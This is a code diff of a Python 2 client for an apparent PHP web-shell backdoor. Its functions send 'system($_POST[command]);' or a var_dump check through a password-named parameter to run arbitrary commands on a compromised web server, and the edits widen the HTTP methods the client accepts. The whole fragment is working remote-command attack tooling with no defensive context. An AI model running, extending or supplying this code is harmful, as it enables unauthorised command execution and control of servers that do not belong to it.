@@ -37,7 +37,8 @@ def init(url, method, auth):
 
 def shell_exec(url, method, auth, command):
     # system, exec, shell_exec, popen, proc_open, passthru
-    if method == "POST":
+    method = string.upper(method)
+    if method == "POST" or method == "REQUEST":
         data = {auth:"system($_POST[command]);",  "command":command}
         response = requests.post(url, data=data)
     elif method == "GET":
@@ -75,7 +76,8 @@ def check_working(url, method, auth):
     value = random_string(32, string.letters)
     print "[+] Using key : [%s]" % (key)
     print "[+] Using value : [%s]" % (value)
-    if method == "POST":
+    method = string.upper(method)
+    if method == "POST" or method == "REQUEST":
         data = {auth:'var_dump("$_POST[%s]");' % (key), key:value}
         response = requests.post(url, data=data)
     elif method == "GET":
@@ -84,7 +86,7 @@ def check_working(url, method, auth):
         data = {key:value}
         response = requests.post(url, data=data)
     else:
-        return "Not supported method!"
+        return False
     content = response.content
     return value in content
 
